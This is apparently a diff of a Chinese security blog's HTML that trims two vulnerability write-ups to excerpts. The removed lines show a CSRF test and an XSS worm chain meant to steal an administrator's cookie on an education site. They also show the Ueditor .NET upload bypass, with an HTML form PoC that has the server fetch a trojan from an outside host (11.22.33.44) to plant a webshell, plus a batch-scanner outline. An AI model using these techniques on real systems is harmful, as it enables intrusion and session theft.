-<h3 id="0x03-CSRF"><a href="#0x03-CSRF" class="headerlink" title="0x03 CSRF"></a>0x03 CSRF</h3><p>填写150手机号发票所有信息<br><img src="https://www.tu3k.cn/images/edu/4.png" alt="CSRF" title="CSRF"></p>
-<p>保存burp生成CSRF POC<br>换个浏览器登录137手机号访问<br><img src="https://www.tu3k.cn/images/edu/5.png" alt="CSRF1" title="CSRF1"></p>
-<p>success：200 成功修改<br><img src="https://www.tu3k.cn/images/edu/6.png" alt="CSRF2" title="CSRF2"></p>
-<h3 id="0x04-组合拳"><a href="#0x04-组合拳" class="headerlink" title="0x04 组合拳"></a>0x04 组合拳</h3><p>最后在前台发现了申请课程报名的地方，和个人中心一样，存在XSS和CSRF，插入蠕虫代码，即可打到管理者Cookie。</p>
-
     
 </div>
     
@@ -603,6 +559,10 @@
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">教育系统 漏洞挖掘</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a href="/2020/12/28/edu_bug/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -648,14 +608,7 @@
     
 <div class="article-entry" itemprop="articleBody">
     
-        
         <h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p><strong>Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。由于上传点只验证了Content-Type的值，只需要修改Type类型和文件名即可绕过上传。</strong></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>网上的POC</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;ueditor&#x2F;net&#x2F;controller.ashx?action&#x3D;catchimage&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line"> &lt;p&gt;shell addr: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;source[]&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
-<p>复现的时候，需要一个服务器，放木马文件 【shell addr】后填写的就是服务器上木马的地址加上后缀（?.aspx），例如：<a target="_blank" rel="noopener" href="http://11.22.33.44/muma.jpg?.aspx">http://11.22.33.44/muma.jpg?.aspx</a>  点击提交 如果存在漏洞会返回shell地址</p>
-<p><img src="http://www.tu3k.cn/images/ueditor.png" alt="ueditor编辑器漏洞" title="ueditor编辑器漏洞"></p>
-<p>写了个批量脚本，也是用php写的第一个脚本，写了整整一天一夜，遇到不少难题，看到我博客的朋友可以自己尝试写一写，这里把思路提供给大家。<br>思路：<br>①获取文本内url并拼接请求返回包验证漏洞是否存在。<br>②创建fsockopen信道，构造 发送post包到信道内。<br>③接着发送到服务器获取返回包，正则匹配返回包内是否存在上传成功的文件，取出拼接即可。</p>
-
     
 </div>
     
@@ -668,6 +621,10 @@
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Ueditor%E6%BC%8F%E6%B4%9E/" rel="tag">Ueditor漏洞</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a href="/2020/12/27/ueditor_net_upload/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
